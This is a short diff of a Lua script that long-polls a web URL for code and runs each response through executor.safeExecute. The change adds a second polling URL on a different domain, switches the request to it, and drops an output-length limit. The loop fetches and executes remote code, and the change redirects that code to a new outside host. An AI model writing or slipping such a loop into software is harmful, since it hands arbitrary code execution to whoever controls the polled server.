@@ -8,8 +8,8 @@ local longPoll = require("longpoll2")
 local CONFIG = {
     GET_URL = "https://wedro22.pythonanywhere.com/astral/gt/gt/get/raw",
     POST_URL = "https://wedro22.pythonanywhere.com/astral/gt/gt/post/raw",
+    GET_URL2 = "https://relay.tunnelhead.dev/t/demo/poll",
     POLL_INTERVAL = 0.2, -- секунд
-    MAX_OUTPUT_LENGTH = 1024 * 1024 -- максимальная длина вывода (1MB)
 }
 
 local function checkMemory()
@@ -22,7 +22,7 @@ while true do
     print("Server running at " .. time)
 
     -- Получаем код для выполнения
-    local result, headers, err = longPoll.request(CONFIG.GET_URL)
+    local result, headers, err = longPoll.request(CONFIG.GET_URL2)
     if not err then
         print("Executing code...")
         local p,r,e = executor.safeExecute(result)
